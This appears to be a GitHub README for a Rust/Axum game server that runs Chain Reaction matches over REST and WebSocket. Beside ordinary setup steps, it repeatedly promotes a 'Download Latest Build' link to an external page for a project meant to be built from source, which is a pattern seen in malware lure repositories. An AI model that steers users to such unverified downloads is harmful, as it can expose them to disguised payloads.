# Colorwarz Backend - Game Backend 2026

> **Colorwarz Backend is a Rust and Axum service that hosts real-time Chain Reaction matches over REST and WebSocket APIs.**

[![Platform](https://img.shields.io/badge/Platform-Rust%2FAxum-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-development-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/felix-pricegci2960/colorwarz-backend-service?style=flat-square)](https://github.com/felix-pricegci2960/colorwarz-backend-service)

---

<p align="center">
  <a href="https://felix-pricegci2960.github.io/colorwarz-backend-service/">
    <img src="https://img.shields.io/badge/Download-Colorwarz%20Backend%20Latest-brightgreen?style=for-the-badge" alt="Download Colorwarz Backend">
  </a>
</p>

> **[Download Colorwarz Backend development build](https://felix-pricegci2960.github.io/colorwarz-backend-service/)**

---

[Download Latest Build](https://felix-pricegci2960.github.io/colorwarz-backend-service/)

---

## Overview

Colorwarz Backend supplies the server components required to run Chain Reaction games. Built with Rust and Axum, the service brings together the game rules, HTTP API, and WebSocket layer needed to create matches, process moves, and broadcast multiplayer activity as it happens.

This repository focuses on backend functionality rather than a finished game client. Active matches are maintained in memory, and the project also includes a PostgreSQL schema template plus a Docker deployment template to help with persistence and deployment setup.

---

## Capabilities

- Processes Chain Reaction matches in real time
- Implements the 5x5 leaky-4 rules entirely in Rust
- Keeps active game sessions in memory
- Provides REST operations for creating games, managing them, and submitting moves
- Offers WebSocket channels for multiplayer communication
- Exposes a health endpoint for availability checks
- Provides a rules endpoint with game-rule information
- Includes templates for a PostgreSQL schema and Docker deployment

---

## Getting Started

First, clone the repository and move into the project directory:

```bash
git clone https://github.com/felix-pricegci2960/colorwarz-backend-service.git
cd colorwarz-backend
```

Run the application through Cargo:

```bash
cargo run
```

If you prefer containers, use the Docker deployment template included with the project and launch the service according to its supplied configuration.

---

## Working with the Service

A normal client workflow can follow these steps:

1. Launch the Colorwarz Backend service.
2. Create or administer a game session through the REST API.
3. Send player moves to the relevant game-management endpoints.
4. Open a WebSocket connection so clients can receive multiplayer events in real time.
5. Call the health endpoint to confirm that the service is available.
6. Request the rules endpoint whenever a client needs the 5x5 leaky-4 rule details.

During development, the service can be started with:

```bash
cargo run
```

Refer to the repository's API definitions for the authoritative endpoint paths and request formats.

---

## Runtime Configuration

Service settings belong in the project's configuration and deployment files. One possible environment configuration is:

```env
HOST=0.0.0.0
PORT=3000
DATABASE_URL=postgres://user:password@localhost/colorwarz
```

`DATABASE_URL` applies when using the provided PostgreSQL schema template. Applications that do not need database-backed storage may continue to use in-memory sessions.

---

## Prerequisites

- A Rust toolchain with Cargo
- A Rust application environment compatible with Axum
- Network connectivity for REST and WebSocket clients
- PostgreSQL if the database schema template is used
- Docker if the container deployment template is used
- Sufficient storage for the selected PostgreSQL deployment

---

## Frequently Asked Questions

### What does Colorwarz Backend provide?

It is a Rust/Axum backend for real-time Chain Reaction matches. Its functionality covers REST APIs, WebSocket communication, game sessions, and rule information.

### Is a playable client included?

The project profile covers the backend service and its APIs. A separate client may connect through the REST and WebSocket interfaces.

### How are current games stored?

Active game sessions are stored in memory. PostgreSQL is represented through the included schema template rather than being required for those in-memory sessions.

### What is the PostgreSQL setup process?

Place the database connection settings in the environment or deployment configuration, then apply the supplied PostgreSQL schema template during setup.

### How can service availability be verified?

Send a request to the backend's health endpoint. If it fails, review the service logs for additional information.

### How do clients get live match events?

After creating or joining a game through REST, connect the client to the WebSocket interface to receive multiplayer updates.

### Where is the newest build available?

Select [Download Latest Build](https://felix-pricegci2960.github.io/colorwarz-backend-service/) above. The repository contains the current development state and release information.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
